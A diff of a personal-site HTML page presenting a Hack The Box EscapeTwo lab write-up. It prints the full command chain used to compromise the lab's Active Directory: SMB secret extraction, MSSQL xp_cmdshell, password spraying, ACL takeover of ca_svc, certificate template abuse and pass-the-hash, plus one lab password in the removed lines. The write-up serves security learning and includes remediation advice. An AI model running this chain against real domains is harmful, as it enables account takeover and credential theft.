@@ -1,175 +1,378 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="HTB EscapeTwo parsed writeup with full section flow, commands, notes, and screenshot evidence." />
-  <title>HTB EscapeTwo Writeup | Will DeDominico</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="../assets/css/style.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Default &#x60;rose&#x60; creds → SMB share with spreadsheet secrets → &#x60;sa&#x60; MSSQL → &#x60;sql_svc&#x60; config file leak → password spray to &#x60;ryan&#x60; → ADCS ESC-style chain via &#x60;ca_svc&#x60; to Administrator NT hash.">
+<title>HTB EscapeTwo · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
 </head>
-<body>
-  <div class="background-noise" aria-hidden="true"></div>
-  <header class="site-header">
-    <div class="logo-lockup">
-      <div class="logo-mark" aria-hidden="true">💾</div>
-      <a href="../index.html#home" class="logo-type">Will<span>DeDominico</span></a>
-    </div>
-    <button class="nav-toggle" aria-expanded="false" aria-controls="site-nav">
-      <span class="sr-only">Toggle navigation</span>
-      <span></span>
-      <span></span>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
     </button>
-    <nav id="site-nav" class="site-nav" aria-expanded="false">
-      <a href="../index.html#home">Home</a>
-      <a href="../index.html#experience">Experience</a>
-      <a href="../index.html#projects">Projects</a>
-      <a href="../index.html#writeups" class="is-active">Writeups</a>
-      <a href="../index.html#github">GitHub</a>
-      <a href="../index.html#ctf">CTFs</a>
-      <a href="../index.html#htb">HTB</a>
-      <a href="../index.html#clubs">Clubs</a>
-      <a href="../index.html#education">Education</a>
-    </nav>
-  </header>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
 
-  <main>
-    <article class="section blog-layout post-content" aria-labelledby="post-title">
-      <header>
-        <h1 id="post-title">HTB EscapeTwo Writeup</h1>
-        <div class="post-meta">
-          <time datetime="2025-06-08">June 8, 2025</time>
-          <span>14 minute read</span>
-          <div class="post-tags" aria-label="Topics">
-            <span class="post-tag">HTB</span>
-            <span class="post-tag">Easy</span>
-            <span class="post-tag">Windows</span>
-            <span class="post-tag">LDAP</span>
-            <span class="post-tag">SMB</span>
-            <span class="post-tag">AD CS</span>
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-ESCAPETWO</span></span>
+    <span class="wp-crumb-r">ENG#03 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 25.05.15</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-">
+          
+          
+          
+          <span class="wp-hero-mono">OPS</span>
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-easy">EASY</span>
+            <span class="wp-chip wp-chip-os os-windows">WINDOWS</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">AD</span><span class="wp-chip wp-chip-ghost tag-cycle-1">LDAP</span><span class="wp-chip wp-chip-ghost tag-cycle-2">SMB</span><span class="wp-chip wp-chip-ghost tag-cycle-3">ADCS</span>
+            <span class="wp-chip wp-chip-pts">30 PTS</span>
           </div>
+          <h1 class="wp-title">HTB EscapeTwo<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">Default `rose` creds → SMB share with spreadsheet secrets → `sa` MSSQL → `sql_svc` config file leak → password spray to `ryan` → ADCS ESC-style chain via `ca_svc` to Administrator NT hash.</p>
         </div>
-      </header>
+      </div>
+    </div>
 
-      <figure class="post-hero">
-        <img src="../assets/img/writeups/htb-escapetwo.png" alt="First page preview of the HTB EscapeTwo writeup PDF report" />
-        <figcaption>Parsed from your HTB EscapeTwo PDF report. Target profile: Easy Windows AD/SQL/CA stack.</figcaption>
-      </figure>
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>sequel.htb</dd></div>
+        <div><dt>REF</dt><dd>10.10.11.51</dd></div>
+        <div><dt>START</dt><dd>13:33 CDT</dd></div>
+        
+        <div><dt>DURATION</dt><dd>14 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
 
-      <div class="post-body">
-        <p><strong>Description (parsed):</strong> EscapeTwo is tagged easy but requires solid LDAP, SMB, SQL, and AD certificate exploitation fundamentals to reach administrator access.</p>
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 6 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">ADMIN</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#recon">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">RECON</div>
+        <div class="kc-sub">ldap + smb</div>
+        <div class="kc-tag kc-tag-warn">NETEXEC</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#creds">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">CREDS</div>
+        <div class="kc-sub">.xlsx xml leak</div>
+        <div class="kc-tag kc-tag-warn">SMB</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#sql">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">SQL</div>
+        <div class="kc-sub">xp_cmdshell → .INI leak</div>
+        <div class="kc-tag kc-tag-warn">MSSQL</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#user">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">USER</div>
+        <div class="kc-sub">ryan password spray</div>
+        <div class="kc-tag kc-tag-warn">WINRM</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#adcs">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.05</div>
+        <div class="kc-stage">ADCS</div>
+        <div class="kc-sub">ca_svc shadow + template</div>
+        <div class="kc-tag kc-tag-warn">CERTIPY</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#admin">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.06</div>
+        <div class="kc-stage">ADMIN</div>
+        <div class="kc-sub">Administrator NT hash</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
 
-        <div class="content-card">
-          <h3>Default Credentials (as documented)</h3>
-          <ul>
-            <li><code>rose / KxEPkKe6R8su</code></li>
-          </ul>
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#recon" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">RECON</span>
+        </a>
+        <a href="#creds" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">CREDS</span>
+        </a>
+        <a href="#sql" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">SQL</span>
+        </a>
+        <a href="#user" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">USER</span>
+        </a>
+        <a href="#adcs" class="wp-toc-row" data-stage="05">
+          <span class="n">05</span>
+          <span class="t">ADCS</span>
+        </a>
+        <a href="#admin" class="wp-toc-row" data-stage="06">
+          <span class="n">06</span>
+          <span class="t">ADMIN</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="recon" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; RECON</div>
+<h2 class="wp-stage-title">Default creds open the front door.</h2>
+<div class="wp-stage-body"><p><code>rose / [REDACTED]</code> are the provided credentials. Nmap confirms a full AD stack: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nmap -A -T5 -oN nmap.txt 10.10.11.51 --min-rate 2000
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+389/tcp   open  ldap     Microsoft AD LDAP (Domain: sequel.htb)
+445/tcp   open  microsoft-ds
+1433/tcp  open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00
+5985/tcp  open  http     Microsoft HTTPAPI 2.0</code></pre>
+</div>
+Enumerate domain users with netexec + the provided creds:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ netexec ldap 10.10.11.51 -u rose -p &#39;[REDACTED]&#39; --users
+LDAP  [+] sequel.htb\rose:[REDACTED]
+LDAP  Administrator  Guest  krbtgt  michael  ryan  oscar  sql_svc  rose  ca_svc</code></pre>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-escapetwo/01-netexec-users.png" alt="rose&#39;s provided creds pull the full AD user list — sql_svc + ca_svc are the flags" loading="lazy"><figcaption>rose&#39;s provided creds pull the full AD user list — sql_svc + ca_svc are the flags</figcaption></figure></div>
+</section>
+<section class="wp-stage" id="creds" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; CREDS</div>
+<h2 class="wp-stage-title">`Accounting Department` share → corrupt `.xlsx` leaks XML creds.</h2>
+<div class="wp-stage-body"><p><code>smbclient -L</code> lists an <code>Accounting Department</code> share readable by rose. Two spreadsheets: <code>accounting_2024.xlsx</code> and <code>accounts.xlsx</code>. Both open corrupted in Excel — but <code>.xlsx</code> is just a zip of XML.</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ smbclient &quot;//10.10.11.51/Accounting Department&quot; -U rose
+smb: \&gt; get accounts.xlsx
+$ unzip accounts.xlsx -d accounts/
+$ cat accounts/xl/sharedStrings.xml
+&lt;t&gt;oscar@sequel.htb&lt;/t&gt;
+&lt;t&gt;kevin@sequel.htb&lt;/t&gt;
+&lt;t&gt;NULL&lt;/t&gt;
+&lt;t&gt;sa@sequel.htb&lt;/t&gt;    ← MSSQL sa account
+&lt;t&gt;MSSQL@somelongstring...&lt;/t&gt;</code></pre>
+</div>
+The most interesting leak is <span class="hl-red">sa@sequel.htb</span> — the MSSQL `sa` login.
+
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-escapetwo/02-xlsx-xml.png" alt="accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb" loading="lazy"><figcaption>accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb</figcaption></figure></div>
+</section>
+<section class="wp-stage" id="sql" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; SQL</div>
+<h2 class="wp-stage-title">`xp_cmdshell` + config leak = `sql_svc` password.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · sa · mssqlclient</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ impacket-mssqlclient &#39;sa:[REDACTED]@10.10.11.51&#39;
+SQL (sa  dbo@master)&gt; EXEC xp_cmdshell &#39;type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI&#39;
+[OPTIONS]
+...
+SQLSVCACCOUNT=&quot;SEQUEL\sql_svc&quot;
+SQLSVCPASSWORD=&quot;[REDACTED]&quot;      ← old sql_svc password
+SAPWD=&quot;[REDACTED]&quot;</code></pre>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-escapetwo/03-mssqlclient.png" alt="mssqlclient as sa — xp_cmdshell prints the config INI with the old sql_svc password" loading="lazy"><figcaption>mssqlclient as sa — xp_cmdshell prints the config INI with the old sql_svc password</figcaption></figure>
+Not a current-password match, but the exposed `sql_svc` password is the seed for a password spray.</div>
+</section>
+<section class="wp-stage" id="user" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; USER</div>
+<h2 class="wp-stage-title">Spray it across the whole user list → `ryan`.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nxc smb 10.10.11.51 -u ./users.txt -p ./pass.txt
+SMB  sequel.htb\ryan:[REDACTED]       [+]
+$ nxc winrm 10.10.11.51 -u ryan -p &#39;[REDACTED]&#39;
+WINRM 5985 DC01 [+] sequel.htb\ryan:[REDACTED] (Pwn3d!)
+
+<p>$ evil-winrm -i 10.10.11.51 -u ryan -p &#39;[REDACTED]&#39;
+<em>Evil-WinRM</em> PS C:\Users\ryan\Desktop&gt; type user.txt</code></pre></p>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-escapetwo/04-ryan-winrm.png" alt="Password spray hits ryan — WinRM marked Pwn3d!" loading="lazy"><figcaption>Password spray hits ryan — WinRM marked Pwn3d!</figcaption></figure></div>
+</section>
+<section class="wp-stage" id="adcs" data-stage="05">
+<div class="wp-stage-lbl"># STG.05 &middot; ADCS</div>
+<h2 class="wp-stage-title">`WriteOwner` on `ca_svc` → shadow creds → vulnerable template.</h2>
+<div class="wp-stage-body"><p>Running BloodHound as ryan shows exactly one outbound object control: <span class="hl-warn">WriteOwner</span> on <code>ca_svc</code>. That&#39;s enough to seize the Certificate Authority service account.</p>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-escapetwo/05-bloodhound-writeowner.png" alt="ryan@sequel.htb — a single outbound edge: WriteOwner on ca_svc" loading="lazy"><figcaption>ryan@sequel.htb — a single outbound edge: WriteOwner on ca_svc</figcaption></figure>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ryan · bloodyAD + dacledit</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ bloodyAD -u ryan -p &#39;[REDACTED]&#39; -d sequel.htb \
+    --host dc01.sequel.htb set owner ca_svc ryan
+[+] Old owner S-1-5-21-... is now replaced by ryan on ca_svc
+
+<p>$ dacledit.py -action write -rights FullControl <br>    -principal ryan -target ca_svc sequel.htb/ryan:&#39;[REDACTED]&#39;
+[<em>] DACL backed up to dacledit-...bak
+[</em>] DACL modified successfully!</code></pre></p>
+</div>
+Shadow-credential the `ca_svc` account to get its NT hash:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ryan · certipy</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ certipy-ad shadow auto -u &#39;ryan@sequel.htb&#39; -p &#39;[REDACTED]&#39; -account ca_svc
+[*] Generating certificate ... Adding Key Credential ... Authenticating as &#39;ca_svc&#39;
+[*] NT hash for &#39;ca_svc&#39;: [REDACTED]</code></pre>
+</div>
+Enumerate the 34 templates — `DunderMifflinAuthentication` is the deliberately-weakened one. Grab a ticket for `ca_svc`, forge a certificate for <span class="hl-red">administrator@sequel.htb</span>:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ryan · certipy</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k \
+    -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
+[*] Successfully updated &#39;DunderMifflinAuthentication&#39;
+
+<p>$ certipy-ad req -u ca_svc -hashes :[ca_svc NT hash] <br>    -ca sequel-DC01-CA -template DunderMifflinAuthentication <br>    -target DC01.sequel.htb -dns 10.10.11.51 <br>    -upn <a href="mailto:administrator@sequel.htb">administrator@sequel.htb</a>
+[*] Saved certificate and private key to &#39;administrator_10.pfx&#39;</code></pre></p>
+</div></div>
+</section>
+<section class="wp-stage" id="admin" data-stage="06">
+<div class="wp-stage-lbl"># STG.06 &middot; ADMIN</div>
+<h2 class="wp-stage-title">`certipy auth` → NT hash → PTH → flag.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ryan · certipy</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
+[*] Using principal: administrator@sequel.htb
+[*] Got hash for &#39;administrator@sequel.htb&#39;: aad3b435b51404eeaad3b435b51404ee:[NT HASH]</code></pre>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-escapetwo/06-cert-auth.png" alt="certipy auth prints the LM:NT hash pair for Administrator" loading="lazy"><figcaption>certipy auth prints the LM:NT hash pair for Administrator</figcaption></figure>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · ryan · PTH</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ evil-winrm -i 10.10.11.51 -u administrator -H [NT HASH]
+*Evil-WinRM* PS&gt; type ..\Desktop\root.txt</code></pre>
+</div>
+<aside class="wp-callout wp-tip"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># TIP</div><div class="wp-callout-body"><p>ADCS ESC-style abuse keeps working because admins rarely audit certificate templates. If <code>certipy find --vulnerable</code> returns <em>anything</em> in a lab or pentest, expect trouble in prod too.</p>
+</div></aside></div>
+</section>
+      <nav class="wp-post-nav">
+        <a class="wp-np prev" href="htb-planning-writeup.html">
+          <span class="l">&larr; ENG#02</span>
+          <span class="t">HTB PLANNING</span>
+        </a>
+        
+        <span class="wp-np-sig">LAST SIGNAL &middot; 25.05.15</span>
+        <a class="wp-np next" href="htb-certificate-writeup.html">
+          <span class="l">ENG#04 &rarr;</span>
+          <span class="t">HTB CERTIFICATE</span>
+        </a>
+        
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">netexec</span><span class="purp">auth</span></div>
+          <div class="wp-loadout-row"><span class="tool">smbclient</span><span class="purp">smb</span></div>
+          <div class="wp-loadout-row"><span class="tool">impacket</span><span class="purp">ad</span></div>
+          <div class="wp-loadout-row"><span class="tool">bloodhound</span><span class="purp">graph</span></div>
+          <div class="wp-loadout-row"><span class="tool">bloodyAD</span><span class="purp">ace-flip</span></div>
+          <div class="wp-loadout-row"><span class="tool">certipy</span><span class="purp">adcs</span></div>
+          <div class="wp-loadout-row"><span class="tool">evil-winrm</span><span class="purp">shell</span></div>
         </div>
-
-        <div class="content-card">
-          <h3>Tools Used</h3>
-          <ul>
-            <li>nmap</li>
-            <li>netexec</li>
-            <li>impacket</li>
-            <li>bloodhound</li>
-            <li>bloodyAD</li>
-            <li>smbclient</li>
-            <li>evil-winrm</li>
-            <li>certipy</li>
-          </ul>
-        </div>
-
-        <h2>Enumeration</h2>
-        <h3>Port Scanning - Nmap</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-02.png" alt="EscapeTwo report screenshot showing port scanning results" />
-          <figcaption>EscapeTwo · Port scanning and early service visibility.</figcaption>
-        </figure>
-        <pre><code class="language-bash">nmap -A -T5 -oN nmap.txt 10.10.x.x --min-rate 2000 -Pn</code></pre>
-        <p>The Nmap scan reveals a large service surface, including AD domain controller behavior, certificate authority infrastructure, SQL services, and SMB exposure.</p>
-
-        <h3>LDAP / SMB Enumeration</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-04.png" alt="EscapeTwo report screenshot showing LDAP and SMB enumeration commands" />
-          <figcaption>EscapeTwo · LDAP and SMB user/share discovery.</figcaption>
-        </figure>
-        <pre><code class="language-bash">netexec ldap 10.10.x.x -u rose -p KxEPkKe6R8su --users
-smbclient -L //10.10.x.x/ -U rose
-smbclient \"//10.10.x.x/Accounting Department\" -U rose</code></pre>
-        <p>LDAP user discovery and readable SMB shares expose the initial credential graph and document storage that contains additional secrets.</p>
-
-        <h3>SQL Enumeration and Credential Discovery</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-06.png" alt="EscapeTwo report screenshot showing SQL client and xp_cmdshell usage" />
-          <figcaption>EscapeTwo · SQL client access and config extraction.</figcaption>
-        </figure>
-        <pre><code class="language-bash">mssqlclient.py 'sa:[password]'@10.10.x.x
-EXEC xp_cmdshell 'type \\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI';</code></pre>
-        <p>Recovered SQL-side configuration data yields additional credentials used later for spray-based foothold and privilege pathing.</p>
-
-        <h2>Foothold</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-08.png" alt="EscapeTwo report screenshot showing credential spray and winrm foothold" />
-          <figcaption>EscapeTwo · Password spray to WinRM foothold.</figcaption>
-        </figure>
-        <pre><code class="language-bash">nxc smb 10.10.x.x -u users.txt -p pass.txt
-evil-winrm -i 10.10.x.x -u ryan -p [password]</code></pre>
-        <p>The writeup assembles discovered users/passwords into spray lists, validates SMB auth, then pivots to WinRM-capable credentials for shell access as <code>ryan</code>.</p>
-
-        <div class="callout callout--info" data-label="Operator Note">
-          <p>The report highlights that protocol-specific spray sequencing can reduce time to useful creds (SMB first, WinRM second).</p>
-        </div>
-
-        <h2>Privilege Escalation via AD CS</h2>
-        <p>The escalation path in the PDF is structured in three stages: take ownership of <code>ca_svc</code>, abuse shadow credentials, then request/authenticate administrator cert material.</p>
-
-        <h3>Step 1: Control CA Service Account</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-12.png" alt="EscapeTwo report screenshot showing AD CS account ownership abuse workflow" />
-          <figcaption>EscapeTwo · Step 1 ownership and ACL control.</figcaption>
-        </figure>
-        <pre><code class="language-bash">bloodyAD -u ryan -p [password] -d sequel.htb --host dc01.sequel.htb set owner ca_svc ryan
-dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:[password]
-certipy-ad shadow auto -u ryan@sequel.htb -p [password] -account ca_svc</code></pre>
-
-        <h3>Step 2: Abuse Vulnerable Template</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-13.png" alt="EscapeTwo report screenshot showing vulnerable certificate template abuse" />
-          <figcaption>EscapeTwo · Step 2 vulnerable template abuse.</figcaption>
-        </figure>
-        <pre><code class="language-bash">certipy-ad find -u ryan@sequel.htb -p [password]
-KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.x.x -target dc01.sequel.htb</code></pre>
-
-        <h3>Step 3: Authenticate as Administrator</h3>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-escapetwo/page-14.png" alt="EscapeTwo report screenshot showing administrator certificate auth and pass-the-hash" />
-          <figcaption>EscapeTwo · Step 3 admin authentication and pass-the-hash.</figcaption>
-        </figure>
-        <pre><code class="language-bash">certipy -ad req -u ca_svc -hashes :[ca_svc_NT_hash] -ca sequel-DC01-CA -template DunderMifflinAuthentication -target DC01.sequel.htb -dc-ip 10.10.x.x -dns 10.10.x.x -ns 10.10.x.x -upn administrator@sequel.htb
-certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
-evil-winrm -i 10.10.x.x -u administrator -H [NT_hash]</code></pre>
-
-        <div class="callout callout--warning" data-label="Notes">
-          <p>The report explicitly distinguishes LM vs NT hash output and uses pass-the-hash directly instead of cracking, which keeps time-to-root low.</p>
-        </div>
-
       </div>
 
-      <footer class="post-footer">
-        <p>Full technical report source:</p>
-        <a class="button primary" href="https://github.com/Moriz82/WriteUps-and-Reports/blob/main/HTB/HTB%20EscapeTwo%20Write%20Up.pdf" target="_blank" rel="noopener">Open Original PDF</a>
-        <a class="button ghost" href="../index.html#writeups">Back to Writeups</a>
-      </footer>
-    </article>
-  </main>
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Never commit credentials inside shared spreadsheets or config files</li>
+          <li>Disable &#x60;xp_cmdshell&#x60; on MSSQL; least-privilege service accounts</li>
+          <li>Scope &#x60;WriteOwner&#x60; / &#x60;GenericAll&#x60; ACEs on cert authority objects</li>
+          <li>Harden default cert templates (no &#x60;EnrolleeSuppliesSubject&#x60;, strong EKU scoping)</li>
+        </ul>
+      </div>
+    </aside>
 
-  <footer class="site-footer">
-    <p>© <span id="copyright-year"></span> Will DeDominico · Field-tested from San Antonio, TX.</p>
-  </footer>
+  </div>
 
-  <script src="../assets/js/main.js"></script>
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">72 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-04-22 18:33 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
